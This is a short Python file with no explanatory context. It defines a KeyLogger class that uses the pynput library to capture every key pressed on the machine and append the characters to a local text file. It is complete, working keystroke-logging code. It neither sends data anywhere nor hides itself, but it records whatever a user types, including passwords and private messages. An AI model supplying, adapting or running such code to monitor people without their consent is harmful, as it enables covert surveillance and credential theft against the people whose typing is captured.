from pynput import keyboard
import atexit

class KeyLogger:
    def __init__(self, log_file="keyfile.txt"):
        self.log_file = log_file
        self.listener = None
        atexit.register(self.cleanup)

    def keypressed(self, key):
        with open(self.log_file, 'a') as logkey:
            try:
                char = key.char
                logkey.write(char)
            except AttributeError:
                if key == keyboard.Key.space:
                    logkey.write(' ')
                elif key == keyboard.Key.enter:
                    logkey.write('\n')

    def start(self):
        if not self.listener or not self.listener.is_alive():
            self.listener = keyboard.Listener(on_press=self.keypressed)
            self.listener.daemon = False 
            self.listener.start()

    def stop(self):
        if self.listener:
            self.listener.stop()
            self.listener = None

    def cleanup(self):
        """Ensure proper cleanup when the program exits"""
        self.stop() 